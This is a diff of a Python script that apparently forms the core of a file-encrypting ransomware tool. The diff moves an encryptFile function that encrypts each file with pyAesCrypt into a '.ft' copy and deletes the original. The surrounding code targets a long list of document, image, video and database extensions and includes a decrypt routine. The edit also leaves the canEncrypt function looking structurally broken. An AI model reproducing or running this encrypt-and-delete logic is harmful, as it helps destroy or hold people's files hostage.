@@ -32,6 +32,15 @@ def encryptAllFiles(silent):
 def canEncrypt(file):
   ext = os.path.splitext(file)
   print(ext)
+ 
+def encryptFile(path, file, key, silent):
+  bufferSize = 256 * 1024
+  pyAesCrypt.encryptFile(os.path.join(path, file), os.path.join(path, file+".ft"), key, bufferSize)
+  os.remove(os.path.join(path, file))
+  if silent == False:
+    print("Encriptar:    ", os.path.join(path, file), " -> ",os.path.join(path, file+".ft"))
+  return True
+
 
   exts = [".docx", ".ppam", ".sti", ".vcd", ".3gp", ".sch", ".myd", ".wb2 ", ".docb", ".potx", ".sldx", ".jpeg",
     ".mp4", ".dch", ".frm", ".slk ", ".docm", ".potm", ".sldm", ".jpg", ".mov", ".dip", ".odb", ".dif ", ".dot",
@@ -51,13 +60,6 @@ def canEncrypt(file):
     return True
   return False
 
-def encryptFile(path, file, key, silent):
-  bufferSize = 256 * 1024
-  pyAesCrypt.encryptFile(os.path.join(path, file), os.path.join(path, file+".ft"), key, bufferSize)
-  os.remove(os.path.join(path, file))
-  if silent == False:
-    print("Encriptar:    ", os.path.join(path, file), " -> ",os.path.join(path, file+".ft"))
-  return True
 
 # DECRYPT files ----------------------------------------------------
 def decryptAllFiles(silent, outputdir):
